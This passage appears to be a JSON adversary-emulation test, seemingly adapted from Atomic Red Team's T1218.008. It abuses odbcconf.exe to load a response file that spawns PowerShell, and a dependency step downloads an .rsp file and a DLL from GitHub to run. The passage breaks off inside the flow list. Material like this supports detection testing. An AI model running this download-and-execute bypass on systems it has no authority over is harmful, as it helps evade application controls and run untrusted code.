{
  "id": "331ce274-f9c9-440b-9f8c-a1006e1fce0b",
  "name": "Odbcconf.exe - Load Response File",
  "description": "Execute arbitrary response file that will spawn PowerShell.exe.\nSource files: https://github.com/woanware/application-restriction-bypasses\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "1650c04d-6f25-4b47-81ab-3a5f8a9c33b5",
      "type": "execute-command",
      "data": {
        "command": "cd \"#{rsp_file_path}\"\nodbcconf.exe -f \"#{rsp_file_name}\"\n",
        "command_type": "command_prompt"
      },
      "elevation_required": false
    },
    {
      "id": "90d9df2a-811e-40d1-99c7-c7e30c7d9ec1",
      "name": "Check dependency 1/1",
      "description": "T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{rsp_file_path}#{rsp_file_name}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "9450c3ae-e2d3-42bf-8c75-d2ff9b8d76f0",
      "name": "Resolve dependency 1/1",
      "description": "T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})\n",
      "type": "execute-command",
      "data": {
        "command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp\" -OutFile \"#{rsp_file_path}#{rsp_file_name}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll\" -OutFile \"#{rsp_file_path}\\o.dll\"\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "39523920-91cc-4845-8d59-8f512cb1342d",
      "name": "Re-check dependency 1/1",
      "description": "T1218.008.rsp must exist on disk at specified location (#{rsp_file_path}#{rsp_file_name})\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{rsp_file_path}#{rsp_file_name}\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "90d9df2a-811e-40d1-99c7-c7e30c7d9ec1",
      "p": "on-success",
      "o": "1650c04d-6f25-4b47-81ab-3a5f8a9c33b5"
    },
    {
      "s": "90d9df2a-811e-40d1-99c7-c7e30c7d9ec1",
      "p": "on-failure",
      "o": "9450c3ae-e2d3-42bf-8c75-d2ff9b8d76f0"
    },
    {
      "s": "9450c3ae-e2d3-42bf-8c75-d2ff9b8d76f0",
